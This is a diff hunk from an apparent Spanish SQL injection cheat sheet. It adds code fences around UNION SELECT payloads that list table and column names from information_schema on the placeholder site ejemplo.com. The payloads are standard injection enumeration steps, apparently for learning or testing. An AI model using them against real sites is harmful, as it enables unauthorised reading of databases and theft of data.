@@ -351,15 +351,15 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,schema_name,3,4,5 FROM inform
 ---
 
 ## 4️⃣ Listar nombres de las tablas de una base de datos
-
+```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema="<NOMBRE_BASE_DATOS>"-- -
-
+```
 ---
 
 ## 5️⃣ Listar nombres de las columnas de una tabla
-
+```bash
 http://ejemplo.com/product.php?id=1 UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_schema="<NOMBRE_BASE_DATOS>" AND table_name="<NOMBRE_TABLA>"-- -
-
+```
 ---
 
 ## 6️⃣ Mostrar datos concatenados
